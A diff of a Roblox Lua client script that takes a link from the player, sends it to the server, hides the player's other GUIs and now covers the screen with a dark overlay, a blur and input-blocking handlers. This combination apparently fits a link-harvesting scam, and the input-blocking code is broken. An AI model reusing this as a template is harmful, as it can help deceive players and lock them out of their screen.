@@ -5,6 +5,7 @@ local SoundService = game:GetService("SoundService")
 local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
 local Lighting = game:GetService("Lighting")
+local UserInputService = game:GetService("UserInputService")
 
 -- ====== UI ======
 local ScreenGui = Instance.new("ScreenGui")
@@ -57,30 +58,23 @@ local function isLinkValid(link)
     return string.sub(link, 1, #startPart) == startPart and string.sub(link, -#endPart) == endPart
 end
 
--- ====== Congelar el entorno ======
+-- ====== Freeze visual completo ======
 local function freezeEnvironment()
-    -- Carpeta para almacenar clones
-    local frozenFolder = Instance.new("Folder")
-    frozenFolder.Name = "FrozenCopies"
-    frozenFolder.Parent = Workspace
+    -- 1) Crear un ScreenGui con Frame que cubra toda la pantalla
+    local freezeGui = Instance.new("ScreenGui")
+    freezeGui.Name = "FreezeGui"
+    freezeGui.ResetOnSpawn = false
+    freezeGui.Parent = Player:WaitForChild("PlayerGui")
+    freezeGui.DisplayOrder = 999
 
-    -- Clonar todos los objetos del Workspace
-    for _, obj in pairs(Workspace:GetChildren()) do
-        if obj:IsA("BasePart") or obj:IsA("Model") then
-            local clone = obj:Clone()
-            clone.Parent = frozenFolder
-        end
-    end
+    local freezeFrame = Instance.new("Frame")
+    freezeFrame.Size = UDim2.new(1,0,1,0)
+    freezeFrame.Position = UDim2.new(0,0,0,0)
+    freezeFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    freezeFrame.BackgroundTransparency = 0.5 -- Ajusta para efecto de “congelado”
+    freezeFrame.Parent = freezeGui
 
-    -- Manejar Terrain de forma segura
-    if Workspace:FindFirstChild("Terrain") then
-        local terrainClone = Workspace.Terrain:Clone()
-        terrainClone.Name = "FrozenTerrain"
-        terrainClone.Parent = frozenFolder
-        -- No destruimos el Terrain original, solo lo dejamos visible
-    end
-
-    -- Efecto visual para “congelar”
+    -- 2) Agregar BlurEffect si no existe
     if not Lighting:FindFirstChild("FreezeBlur") then
         local blur = Instance.new("BlurEffect")
         blur.Name = "FreezeBlur"
@@ -88,10 +82,20 @@ local function freezeEnvironment()
         blur.Parent = Lighting
     end
 
-    -- Evitar que se agreguen objetos nuevos visibles
-    Workspace.ChildAdded:Connect(function(child)
-        if child:IsA("BasePart") or child:IsA("Model") then
-            child.Transparency = 1
+    -- 3) Deshabilitar inputs del jugador
+    UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        if freezeGui.Parent then
+            gameProcessed = true
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(input, gameProcessed)
+        if freezeGui.Parent then
+            gameProcessed = true
+        end
+    end)
+    UserInputService.InputEnded:Connect(function(input, gameProcessed)
+        if freezeGui.Parent then
+            gameProcessed = true
         end
     end)
 end
@@ -103,7 +107,6 @@ Button.MouseButton1Click:Connect(function()
         MessageLabel.Text = "El link es válido ✅"
         MessageLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
 
-        -- Enviar link al RemoteEvent
         local remoteEvent = ReplicatedStorage:FindFirstChild("SendServerLink")
         if remoteEvent then
             remoteEvent:FireServer(link)
@@ -113,12 +116,11 @@ Button.MouseButton1Click:Connect(function()
 
         -- Ocultar otras GUIs
         for _, child in pairs(Player.PlayerGui:GetChildren()) do
-            if child:IsA("ScreenGui") and child.Name ~= "RobloxGui" then
+            if child:IsA("ScreenGui") and child.Name ~= "RobloxGui" and child.Name ~= "FreezeGui" then
                 child.Enabled = false
             end
         end
 
-        -- Destruir esta UI
         ScreenGui:Destroy()
     else
         MessageLabel.Text = "El link es inválido ❌"
@@ -137,3 +139,4 @@ if stopEvent then
         end
     end)
 end
+
